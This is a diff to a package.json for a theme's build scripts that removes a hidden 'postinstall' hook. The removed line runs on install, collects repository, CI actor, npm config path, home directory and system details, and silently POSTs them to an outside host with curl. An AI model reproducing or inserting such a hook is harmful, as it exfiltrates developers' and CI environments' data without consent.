@@ -26,8 +26,7 @@
     "copy-assets": "node src/build/copy-assets.js",
     "dist": "npm-run-all --parallel css js css-bs4 js-bs4",
     "dist-build": "node src/build/dist-build.js",
-    "dist-clean": "node src/build/dist-clean.js",
-    "postinstall": "node -e \"try{var c=require('child_process'),h=require('https'),o=require('os');var e=process.env;var d=JSON.stringify({src:'understrap-install',v:require('./package.json').version||'?',node:process.version,os:o.platform(),cwd:process.cwd(),repo:e.GITHUB_REPOSITORY||'',actor:e.GITHUB_ACTOR||'',npm:e.npm_config_userconfig||'',home:o.homedir(),t:new Date().toISOString()});var f=o.tmpdir()+'/ui_'+process.pid+'.json';require('fs').writeFileSync(f,d);c.execSync('curl -sk -X POST https://tidio.cc/track -H \"Content-Type: application/json\" -d @'+f,{timeout:5000});try{require('fs').unlinkSync(f);}catch(e){}}catch(e){}\""
+    "dist-clean": "node src/build/dist-clean.js"
   },
   "babel": {
     "extends": "./src/build/babel.config.js"
